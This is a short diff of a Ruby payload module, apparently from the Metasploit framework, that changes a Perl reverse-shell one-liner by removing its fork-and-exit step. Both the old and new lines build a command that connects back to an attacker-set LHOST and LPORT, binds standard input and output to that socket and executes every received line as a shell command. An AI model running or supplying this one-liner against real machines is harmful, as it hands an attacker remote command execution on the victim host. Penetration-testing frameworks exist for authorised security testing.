@@ -56,7 +56,7 @@ module ReversePerl
 	#
 	def command_string
 
-		cmd = "perl -MIO -e \"$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\\\"#{datastore['LHOST']}:#{datastore['LPORT']}\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\""
+		cmd = "perl -MIO -e \"$c=new IO::Socket::INET(PeerAddr,\\\"#{datastore['LHOST']}:#{datastore['LPORT']}\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\""
 
 	end
 
